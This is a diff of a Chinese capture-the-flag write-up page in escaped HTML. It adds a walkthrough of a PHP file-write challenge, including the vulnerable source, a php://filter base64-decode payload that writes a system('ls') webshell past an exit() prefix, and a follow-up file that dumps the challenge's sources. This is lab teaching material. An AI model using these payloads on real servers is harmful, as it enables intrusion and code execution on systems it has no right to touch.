@@ -469,7 +469,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 	
 &gt;&lt;br&gt;
 获得flag&lt;/p&gt;
-&lt;h3 id=&#34;ezfl_6&#34;&gt;EZFL_6
+&lt;h3 id=&#34;ezfl_6php-远程文件包含rfi---代码执行rce&#34;&gt;EZFL_6(PHP 远程文件包含（RFI） -&amp;gt; 代码执行（RCE）)
 &lt;/h3&gt;&lt;p&gt;访问首页 页面存在 file 参数，查看源码可以看到注释：&lt;!-- include($file); --&gt;&lt;br&gt;
 说明后端大概率直接对 file 做了 include()，先用&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -522,7 +522,6 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 	
 	
 &gt;&lt;br&gt;
-*
 从而枚举根目录,结果在根目录下发现了可疑文件  qingcenctf.txt  &lt;br&gt;
 直接读取&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -540,6 +539,108 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;fl6_3.png&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezfl_7&#34;&gt;EZFL_7
+&lt;/h3&gt;&lt;p&gt;访问首页 直接给了源码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;highlight_file(__FILE__);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if (isset($_POST[&amp;#39;filename&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;content&amp;#39;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    $filename = $_POST[&amp;#39;filename&amp;#39;];
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    $content = $_POST[&amp;#39;content&amp;#39;];
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    file_put_contents($filename, &amp;#34;&amp;lt;?php exit();?&amp;gt;&amp;#34; . $content);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    echo &amp;#34;write ok&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;说明这是任意文件写入，但会强行在前面加 &lt;?php exit();?&gt;，所以不能直接写普通 webshell&lt;br&gt;
+用 php://filter/write=convert.base64-decode/resource=chen.php 绕过前缀，在burp里发 POST&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filename=php://filter/write=convert.base64-decode/resource=chen.php  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;content=APD9waHAgc3lzdGVtKCJscyIpOz8%2B  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这段 content 解码后就是 &lt;?php system(&#34;ls&#34;); ?&gt;  前面的 A 是为了配合固定前缀做对齐&lt;br&gt;
+&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780816992770_fl7_1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fl7_1.png&#34;
+	
+	
+&gt;&lt;br&gt;
+写入成功 访问  &lt;a class=&#34;link&#34; href=&#34;http://docker.qingcen.net:34249/chen.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://docker.qingcen.net:34249/chen.php&lt;/a&gt;&lt;br&gt;
+&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780816996682_fl7_2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fl7_2.png&#34;
+	
+	
+&gt;&lt;br&gt;
+可以看到两个文件 c0nq4er1ng.php  conquer.php  接下来获取内容就行了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php highlight_file(&amp;#34;c0nq4er1ng.php&amp;#34;); echo &amp;#34;\n---\n&amp;#34;; highlight_file(&amp;#34;conquer.php&amp;#34;);?&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;也就是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780816988240_fl7_3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fl7_3.png&#34;
+	
+	
+&gt;&lt;br&gt;
+访问readsrc.php即可看到两个文件的源码&lt;br&gt;
+&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780816995993_fl7_4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fl7_4.png&#34;
 	
 	
 &gt;&lt;/p&gt;
